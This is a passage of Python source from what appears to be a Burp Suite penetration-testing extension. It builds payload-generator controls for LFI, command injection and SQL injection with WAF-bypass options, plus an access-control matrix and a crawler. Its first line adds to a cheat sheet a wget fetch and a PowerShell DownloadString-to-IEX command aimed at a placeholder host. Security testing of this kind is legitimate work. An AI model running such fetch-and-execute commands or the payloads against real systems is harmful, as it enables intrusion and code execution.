        self._txtCheatSheetCommandInj += "\twget http://X.X.X.X/file.txt -O /tmp/file.txt\t\t(New-Object System.Net.WebClient).DownloadString('http://http://X.X.X.X/file.txt') | IEX\n"
        _lblDepth = JLabel("( Depth =", SwingConstants.LEFT)
        _lblDepth.setToolTipText("Generate payloads only for a specific depth.")
        _btnGenerateDict = JButton("Generate the Payload", actionPerformed=self.funcGeneratePayload)
        _btnGenerateDict.setToolTipText("Click to generate payloads.")
        self._lblStatusLabel = JLabel()
        self._lblStatusLabel.setText("Please provide a path for payload generation!")
        self._txtTargetPath = JTextField(self._txtDefaultLFI, 30)
        self._rbDictLFI = JRadioButton('LFI / DT', True, itemStateChanged=self.funcRBSelection);
        self._rbDictLFI.setToolTipText("Payload generation for Local File Inclusion, Directory Traversal.")
        self._rbDictCommandInj = JRadioButton('Command Inj / RCE', itemStateChanged=self.funcRBSelection)
        self._rbDictCommandInj.setToolTipText("Payload generation for Command Injection, Remote Code Execution.")
        self._rbDictSQLi = JRadioButton('SQL Injection', itemStateChanged=self.funcRBSelection)
        self._rbDictSQLi.setToolTipText("Payload generation for various type of SQL attacks.")
        _rbDictCheatSheet = JRadioButton('Cheat Sheet', itemStateChanged=self.funcRBSelection)
        _rbDictFuzzer = JRadioButton('Fuzzer', itemStateChanged=self.funcRBSelection)
        _rbPanel = JPanel()
        _rbPanel.add(self._rbDictLFI)
        _rbPanel.add(self._rbDictCommandInj)
        _rbPanel.add(self._rbDictSQLi)
        _rbGroup = ButtonGroup()
        _rbGroup.add(self._rbDictLFI)
        _rbGroup.add(self._rbDictCommandInj)
        _rbGroup.add(self._rbDictSQLi)
        _rbGroup.add(_rbDictCheatSheet)
        _rbGroup.add(_rbDictFuzzer)
        self._cbDictWafBypass = JCheckBox('Waf Bypass', True)
        self._cbDictWafBypass.setToolTipText("It includes bypass techniques like null bytes, various type of encodings, different file extensions, etc.")
        self._cbDictEquality = JCheckBox(')', False)
        self._cbDictEquality.setToolTipText("Generate payloads only for a specific depth.")
        self._cbDictDepth = JComboBox(list(range(0, 20)))
        self._cbDictDepth.setSelectedIndex(5)
        self._cbDictDepth.setToolTipText("Folder depth limit. How much folder above should it go?")
        _cbDictDepthPanel = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        _cbDictDepthPanel.add(self._cbDictDepth)
        self._cbDictCommandInjEncoding = JCheckBox('URL Encoding', False)
        self._cbDictCommandInjEncoding.setToolTipText("Encodes the payload outcome.")
        self._cbDictCommandInjOpt = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._cbDictCommandInjOpt.add(self._cbDictCommandInjEncoding)
        self._cbDictCommandInjOpt.setVisible(False)
        self._cbStackedSQL = JCheckBox('Stacked Queries', False)
        self._cbStackedSQL.setToolTipText("Stacked Query SQL Injection")
        self._cbTimeBased = JCheckBox('Time-Based', True)
        self._cbTimeBased.setToolTipText("Time-Based SQL Injection")
        self._cbUnionBased = JCheckBox('Union-Based', False, itemStateChanged=self._cbUnionBasedFunc)
        self._cbUnionBased.setToolTipText("Union-Based SQL Injection")
        self._cbUnionDepth = JComboBox(list(range(1, 20)))
        self._cbUnionDepth.setSelectedIndex(4)
        self._cbUnionDepth.setEnabled(False)
        self._cbUnionDepth.setToolTipText("Column numbers")
        self._cbBooleanBased = JCheckBox('Boolean-Based', True)
        self._cbBooleanBased.setToolTipText("Boolean-Based SQL Injection")
        self._cbMssqlBased = JCheckBox('MSSQL', True)
        self._cbMssqlBased.setToolTipText("Select database to include.")
        self._cbMysqlBased = JCheckBox('MYSQL', True)
        self._cbMysqlBased.setToolTipText("Select database to include.")
        self._cbPostgreBased = JCheckBox('POSTGRESQL', True)
        self._cbPostgreBased.setToolTipText("Select database to include.")
        self._cbOracleBased = JCheckBox('ORACLE', True)
        self._cbOracleBased.setToolTipText("Select database to include.")
        self._cbSqlWafBypass = JCheckBox('Waf Bypass', True)
        self._cbSqlWafBypass.setToolTipText("It includes protection bypass techniques, like null bytes, encoding, etc.")
        self._cbSqlEncoding = JCheckBox('URL Encoding', False)
        self._cbSqlEncoding.setToolTipText("Encodes the payload outcome.")
        _tabDictPanel_1 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabDictPanel_1.add(self._txtTargetPath, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(_btnGenerateDict, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(_rbPanel, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_LFI.add(_lblDepth, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.add(self._cbDictEquality, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.add(_cbDictDepthPanel, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.add(self._cbDictWafBypass, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.setVisible(True)
        self._tabDictPanel_SQLType = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_SQLType.add(self._cbMysqlBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.add(self._cbPostgreBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.add(self._cbMssqlBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.add(self._cbOracleBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.setVisible(False)
        self._tabDictPanel_SQLOptions = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_SQLOptions.add(self._cbSqlEncoding, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLOptions.add(self._cbSqlWafBypass, BorderLayout.PAGE_START)        
        self._tabDictPanel_SQLOptions.setVisible(False)
        self._tabDictPanel_SQLi = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_SQLi.add(self._cbStackedSQL, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbBooleanBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbTimeBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbUnionBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbUnionDepth, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.setVisible(False)
        _tabDictPanel_1.add(self._tabDictPanel_LFI, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._cbDictCommandInjOpt, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._tabDictPanel_SQLType, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._tabDictPanel_SQLOptions, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._tabDictPanel_SQLi, BorderLayout.PAGE_START)
        _tabDictPanel_1.setPreferredSize(Dimension(400, 90))
        _tabDictPanel_1.setMinimumSize(Dimension(400, 90))
        # top panel

        # center panel
        _tabDictPanel_2 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        _tabDictPanel_2.add(self._lblStatusLabel)
        # center panel
        
        # bottom panel 
        self._tabDictResultDisplay = JTextPane()
        self._tabDictResultDisplay.setContentType("text")
        self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
        self._tabDictResultDisplay.setEditable(False)
        _tabDictPanel_3 = JPanel(BorderLayout(10, 10))
        _tabDictPanel_3.setBorder(EmptyBorder(10, 0, 0, 0))
        _tabDictPanel_3.add(JScrollPane(self._tabDictResultDisplay), BorderLayout.CENTER)
        # bottom panel 

        self._tabDictPanel = JPanel()
        self._tabDictPanel.setLayout(BoxLayout(self._tabDictPanel, BoxLayout.Y_AXIS))
        self._tabDictPanel.add(_tabDictPanel_1)
        self._tabDictPanel.add(_tabDictPanel_2)
        self._tabDictPanel.add(_tabDictPanel_3)

    def tableMatrixReset(self, ev):
        self.tableMatrix = []        
        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLs','No Authentication'))
        self.tableMatrix = JTable(self.tableMatrix_DM)
        self.tableMatrix_SP.getViewport().setView((self.tableMatrix))
        self.userCount = 0
        self.userNames = []
        self.userNames.append("No Authentication")
        self.userNamesHttpReq = []
        self.userNamesHttpReq.append("")
        self.userNamesHttpUrls = [[]]
        self.httpReqRes = [[],[],[],[],[]]
        self.httpReqRes.append([])      
        self._requestViewer.setMessage("", False)
        self._responseViewer.setMessage("", False)
        self._lblAuthNotification.text = "Please add users to create an auth matrix!"
        self._lblAuthNotification.setForeground (Color.black)
        self._tbAuthNewUser.setForeground (Color.black)        
        self._txtHeaderDefault = "GET /example HTTP/1.1\nHost: localhost.com\nAccept-Encoding: gzip,deflate\nConnection: close\nCookie: SessionID=......"
        self._tbAuthHeader.setText(self._txtHeaderDefault)
        self._txtURLDefault = "http://localhost.com/example"
        self._tbAuthURL.setText(self._txtURLDefault)
        self._txtUserDefault = "User1"
        self._tbAuthNewUser.text = self._txtUserDefault.strip()
        self._btnAuthRun.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._cbAuthColoring.setEnabled(False)
        self._cbAuthGETPOST.setEnabled(False)
        self._cbAuthGETPOST.setSelectedIndex(0)
        self._cbSiteMapDepth.setSelectedIndex(3)
        self._btnAuthNewUserAdd.setEnabled(True)
        self.progressBar.setValue(0)
        self.tableMatrix.getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.getColumnModel().getSelectionModel().addListSelectionListener(self._updateReqResView)
        self._tabAuthPanel.setDividerLocation(0.25)
        self._tabAuthSplitpane.setDividerLocation(0.7)
        self._tabAuthSplitpaneHttp.setDividerLocation(0.5)

        return

    def siteMapGenerator(self, ev):
        t = Thread(target=self.siteMapGeneratorThread, args=[self])
        t.start()
        return

    def siteMapGeneratorThread(self, ev):
        if not self._tbAuthURL.getText().split('\n')[0].strip():
            self._lblAuthNotification.text = "Please provide a valid URL."
            self._lblAuthNotification.setForeground (Color.red)
            return

        _urlAdd = self._tbAuthURL.getText().split('\n')[0].strip()

        if not self.isURLValid(str(_urlAdd)) or _urlAdd == self._txtURLDefault:
            self._tbAuthURL.setForeground (Color.red)
            self._lblAuthNotification.text = "URLs should start with 'http/s' and not have any spaces. Please check: '" + _urlAdd + "'"
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthURL.setForeground (Color.black)
        if not self._tbAuthHeader.getText().strip() or self._tbAuthHeader.getText().strip() == self._txtHeaderDefault:
            self._tbAuthHeader.setForeground (Color.red)
            self._lblAuthNotification.text = "Please provide a valid header!"
            self._lblAuthNotification.setForeground (Color.red)
            return        
        self._tbAuthHeader.setForeground (Color.black)        
        self._lblAuthNotification.setForeground (Color.black)

        self._lblAuthNotification.text = "The crawler has just started. Please bear in mind, links based on Javascript may not be detected properly."
        
        _userURLs = []
        _userURLs.append(_urlAdd)
        folderDepth = 0
        crawledURLs = 0
        header = self._tbAuthHeader.getText()
        userLinks = _urlAdd + "\n"

        for _url in _userURLs:
            try:
                # changing url in the request header
                if str(urlparse.urlparse(_url).path):
                    # check if query string exists
                    if str(urlparse.urlparse(_url).query):
                        header = header.replace(" " + header.splitlines()[0].split(" ", 2)[1], " " + str(urlparse.urlparse(_url).path + "?" + urlparse.urlparse(_url).query))
                    else:
                        header = header.replace(" " + header.splitlines()[0].split(" ", 2)[1], " " + str(urlparse.urlparse(_url).path))
                else:
                    header = header.replace(" " + header.splitlines()[0].split(" ", 2)[1], " " + "/")
                
                # header methods
                if "GET" in header[:3]:
                    # request was in GET method and will be in POST
                    if self._cbAuthGETPOST.getSelectedIndex() == 1:
                        header = self._callbacks.getHelpers().toggleRequestMethod((header))
                else:
                    # request was in POST alike method and will be in GET
                    if self._cbAuthGETPOST.getSelectedIndex() == 0:
                        header = self._callbacks.getHelpers().toggleRequestMethod((header))
                
                portNum = 80
                if urlparse.urlparse(_url).port:
                    portNum = urlparse.urlparse(_url).port
                else:
                    if urlparse.urlparse(_url).scheme == "https":
                        portNum = 443

                _httpReqRes = self._callbacks.makeHttpRequest(self._helpers.buildHttpService(urlparse.urlparse(_url).hostname, portNum, urlparse.urlparse(_url).scheme), header)
                msgBody = self._helpers.bytesToString(_httpReqRes.getResponse()[self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getBodyOffset():])

                if msgBody:
                    links = re.findall("(https?://[^\\s\'\"<]+)", msgBody, re.IGNORECASE)
                    for link in links:
                        _ext = os.path.splitext(urlparse.urlparse(link).path)[1]
                        if link not in _userURLs and link and urlparse.urlparse(_url).hostname == urlparse.urlparse(link).hostname and not any(re.findall(r'(log|sign|time).*(off|out|in|on)|(error|expire|kill|terminat|delete|remove)', link, re.IGNORECASE)) and "/." not in link and not any(re.findall(r'^\.(gif|jpg|jpeg|png|css|js|ico|svg|eot|woff|woff2|ttf)$', _ext, re.IGNORECASE)):
                            _userURLs.append(link)
                            userLinks = userLinks + link + "\n"

                    links = re.findall("<a\\s+[^>]*?href=[\'|\"](.*?)[\'\"].*?>", msgBody, re.IGNORECASE)
                    for link in (links.pop(0) for _ in xrange(len(links))):
                        if not ".." in link:
                            link = link.replace("/.", "/")
                        if link == ".":
                            link = "/"
                        if "%3a" in link[0:10]:
                            link =  urllib.unquote(link)

                        if link.startswith('/'):
                            link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + link
                        elif link.startswith('#'): 
                            link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + urlparse.urlparse(_url)[2] + link
                        elif link.startswith('..'):
                            path = urlparse.urlparse(_url)[2]
                            if not path.endswith('/'):
                                path = str(urlparse.urlparse(_url)[2]).rsplit('/', 1)[0] + "/"
                            _endswith =""
                            if link.endswith('/'):
                                _endswith ="/"
                            link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + str(posixpath.normpath(path + link)) + _endswith
                        elif link.startswith('javascript'):
                            link = ""
                            continue
                        elif not link.startswith('http') and link:
                            link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + '/' + link
                        else: 
                            link = ""
                            continue

                        _ext = os.path.splitext(urlparse.urlparse(link).path)[1]

                        if link not in _userURLs and link and urlparse.urlparse(_url).hostname == urlparse.urlparse(link).hostname and not any(re.findall(r'(log|sign|time).*(off|out|in|on)|(error|expire|kill|terminat|delete|remove)', link, re.IGNORECASE)) and "/." not in link and not any(re.findall(r'^\.(gif|jpg|jpeg|png|css|js|ico|svg|eot|woff|woff2|ttf)$', _ext, re.IGNORECASE)):
                            _userURLs.append(link)
                            userLinks = userLinks + link + "\n"
                            self._lblAuthNotification.text = "The crawler has found " + str(len(_userURLs)) + " links so far, and it is still in progress: '" + str(_userURLs.index(_url) + 1) + "/" + str(crawledURLs + 1) + "', current folder depth: '" + str(folderDepth) + "'."

                if _userURLs.index(_url) == crawledURLs:
                    if folderDepth == self._cbSiteMapDepth.getSelectedIndex():
                        break
                    crawledURLs = len(_userURLs) - 1
                    folderDepth = folderDepth + 1
                
            except:
                self._lblAuthNotification.text = str(sys.exc_info()[1])
        
        self._tbAuthURL.setText(userLinks)
        self._lblAuthNotification.text = "The crawler has just finished, and " + str(len(_userURLs)) + " links have been found. Other hosts than user session are ignored." 

class UserEnabledRenderer(TableCellRenderer):
    def __init__(self, defaultCellRender, userNamesHttpUrls):
        self._defaultCellRender = defaultCellRender
        self.urlList = userNamesHttpUrls
        self.colorsUser = [Color(204, 229, 255), Color(204, 255, 204), Color(204, 204, 255), Color(255, 228, 196)]        
        self.colorsAlert = [Color.white, Color(255, 153, 153), Color(255, 218, 185), Color(255, 255, 204), Color(211, 211, 211)]

    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        cell = self._defaultCellRender.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column)
        toolTipMessage = ""
        cell.setBackground(self.colorsAlert[0])
        try:
            if column == 0:
                # URL section - default white
                cell.setBackground(self.colorsAlert[0])
                toolTipMessage = "Requested URLs!"
            elif table.getValueAt(row, column) and not table.getValueAt(row, column).startswith("HTTP 2") and not table.getValueAt(row, column).startswith("HTTP 3"):
                # error or http 4XX/5XX
                cell.setBackground(self.colorsAlert[4])
                toolTipMessage = "The request returns HTTP 4XX/5xx response!"
            elif column == 1:
                # no auth
                cell.setBackground(self.colorsAlert[0])
                if _colorful:
                    for y in range(2, table.getColumnCount()):
                        if table.getValueAt(row, 0) in self.urlList[y - 1]:
                            if table.getValueAt(row, y) == table.getValueAt(row, column):
                                if table.getValueAt(row, y).startswith("HTTP 2"):
                                    cell.setBackground(self.colorsAlert[1])
                                    toolTipMessage = "The URL returns HTTP 2XX without authentication, and the response is same as URL owner!"
                                elif table.getValueAt(row, y).startswith("HTTP 3"):
                                    if not cell.getBackground() == self.colorsAlert[1] and not cell.getBackground() == self.colorsAlert[2]:
                                        cell.setBackground(self.colorsAlert[3])
                                        toolTipMessage = "The URL returns HTTP 3XX without authentication, but the response is same as URL owner!"
                            elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
                                if not cell.getBackground() == self.colorsAlert[1]:
                                    cell.setBackground(self.colorsAlert[2])
                                    toolTipMessage = "The URL returns same HTTP response code with URL owner, but no authentication!"
            elif table.getValueAt(row, 0) in self.urlList[column - 1]:
                cell.setBackground(self.colorsUser[column - 2])
                toolTipMessage = "Http response of the user's own URL!"
            else:    
                # other users
                cell.setBackground(self.colorsAlert[0])
                if _colorful:
                    for y in range(2, table.getColumnCount()):
                        if table.getValueAt(row, 0) in self.urlList[y - 1]:
                            if table.getValueAt(row, y) == table.getValueAt(row, column):
                                if table.getValueAt(row, y).startswith("HTTP 2"):
                                    cell.setBackground(self.colorsAlert[1])
                                    toolTipMessage = "The URL is not in the user's list, but the response is same as URL owner"
                                elif table.getValueAt(row, y).startswith("HTTP 3"):
                                    if not cell.getBackground() == self.colorsAlert[1] and not cell.getBackground() == self.colorsAlert[2]:
                                        cell.setBackground(self.colorsAlert[3])
                                        toolTipMessage = "The URL is not in the user's list, but the response is same as URL owner!"
                            elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
                                if not cell.getBackground() == self.colorsAlert[1]:    
                                    cell.setBackground(self.colorsAlert[2])
                                    toolTipMessage = "The URL is not in the user's list, but returns same HTTP response code with URL owner!"
        except:
            cell.setBackground(self.colorsAlert[0])

        if isSelected:            
            cell.setBackground(Color(240, 240, 240))
            
        if hasFocus:           
            cell.setBackground(Color(240, 240, 240))
            cell.setFont(cell.getFont().deriveFont(Font.BOLD | Font.ITALIC));
            cell.setToolTipText(toolTipMessage)
        
        return cell

class CustomDefaultTableModel(DefaultTableModel):
    def __init__(self, data, headings) :
        DefaultTableModel.__init__(self, data, headings)

    def isCellEditable(self, row, col) :
        return col == 0
